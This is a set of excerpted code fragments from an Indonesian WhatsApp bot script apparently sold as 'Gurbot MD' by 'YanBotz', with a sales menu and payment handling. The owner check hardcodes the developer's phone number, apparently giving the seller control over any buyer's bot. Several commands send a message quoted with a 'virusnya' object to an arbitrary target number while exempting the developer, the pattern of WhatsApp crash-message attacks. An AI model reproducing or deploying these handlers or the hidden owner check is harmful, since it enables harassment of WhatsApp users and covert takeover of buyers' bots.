...
const isOwner = [`${setting.ownerNumber}`,"6285817964592@s.whatsapp.net","6285817964592@s.whatsapp.net"].includes(sender) ? true : false
...
ID: @${sender.split('@')[0]}
Nama Lama: ${setting.botName}
Nama Baru: ${data_deposit.data.nama_baru}
Waktu: ${jam} WIB_`)
await sleep(2000)
...
var strip = '```'
var menu_list =`
Utamakan chat to the point 🚀

Admin hanya melayani chat
Seputar gurabot & transaksi

${strip}Telpon/Spam blokir 🚫${strip}

Admin 1 : 0858-1796-4592
Admin 2 : 0858-1796-4592

*SCRIPT BOT 🛒*
Rp50.000 - ( Topup & Fitur 300+ )
Rp100.000 - ( Topup & Fitur 600+ )

Ready Nokos Whatsapp +1
Harga Murah? Chat Admin
Open Stok Terbatas⚠️
...
const gurbot = '6285817964592@s.whatsapp.net'
...
case 'sc': case 'script':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
let text_buysc =`Mau beli scriptnya? harga murah kok.
...
var bg_YanBotz = '6285817964592@s.whatsapp.net'
...
const listMessage = {
  ...
  footer: '© created by YanBotz official',
...
conn.sendMessage(from, { caption: cap, image: { url: feta.data.qris }, buttons: buto, footer: '© created by Yanbotz official' })
}
console.log(feta)
}
break
...
.then(data => {
var opt = { packname: 'Gurbot MD', author: 'By YanBotz' }
...
if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx`)
var num = q+"@s.whatsapp.net"
var dev = '6285817964592@s.whatsapp.net'
if (num == dev) return reply('Itu developer gua')
if (num == sender) return reply('Itu Nomor Lu Sendiri')
await sleep(3000)
conn.sendMessage(num, {text:philips}, {quoted:virusnya})
...
if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx`)
var num = q+"@s.whatsapp.net"
var dev = '6285817965592@s.whatsapp.net'
if (num == dev) return reply('Itu developer gua')
if (num == sender) return reply('Itu Nomor Lu Sendiri')
conn.sendMessage(num, {text:philips}, {quoted:virusnya})
await sleep(3000)
...
if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx`)
var num = q+"@s.whatsapp.net"
var dev = '6285817964692@s.whatsapp.net'
if (num == dev) return reply('Itu developer gua')
if (num == sender) return reply('itu nomor lu sendiri')
await sleep(3000)
conn.sendMessage(num, {text:'p'}, {quoted:virusnya})
